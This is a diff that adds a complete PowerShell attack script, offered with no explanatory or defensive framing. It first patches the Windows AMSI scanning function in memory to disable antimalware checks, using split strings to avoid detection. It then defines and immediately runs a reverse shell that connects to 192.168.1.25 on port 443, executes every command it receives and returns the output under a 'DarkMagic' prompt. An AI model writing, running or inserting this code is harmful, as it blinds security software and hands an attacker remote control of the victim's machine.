@@ -1,0 +1,82 @@
+Start-Sleep 5;
+
+$shush_we_legit = @'
+using System;
+using System.Runtime.InteropServices;
+
+public class shush_we_legit {
+
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+}
+'@
+
+Add-Type $shush_we_legit
+
+$LoadLibrary = [shush_we_legit]::LoadLibrary("am" + "si.dll");
+$Address = [shush_we_legit]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer");
+$p = 0;
+[shush_we_legit]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p);
+$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3);
+[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6);
+
+function Invoke-SomeSickShit
+{
+    [CmdletBinding(DefaultParameterSetName="backitup")] Param(
+
+        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="backitup")]
+        [String]
+        $IPAddress,
+
+        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="backitup")]
+        [Int]
+        $Port,
+
+        [Parameter(ParameterSetName="backitup")]
+        [Switch]
+        $backitup
+    )
+        if ($backitup)
+        {
+            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
+        }
+        $stream = $client.GetStream()
+        [byte[]]$bytes = 0..65535|%{0}
+       
+
+        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+        {
+            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
+            $data = $EncodedText.GetString($bytes,0, $i);
+            try
+            {
+                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
+            }
+            catch
+            {
+                Write-Warning "Something went wrong with execution of command on the target."
+                Write-Error $_
+            }
+            $sendback2  = $sendback + 'DarkMagic (PS) ' + (Get-Location).Path + '> '
+            $x = ($error[0] | Out-String)
+            $error.clear()
+            $sendback2 = $sendback2 + $x
+            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+            $stream.Write($sendbyte,0,$sendbyte.Length)
+            $stream.Flush()
+        }
+        $client.Close()
+        if ($listener)
+        {
+            $listener.Stop()
+        }
+};
+
+Invoke-SomeSickShit -backitup -IPAddress 192.168.1.25 -Port 443 -ErrorAction SilentlyContinue;
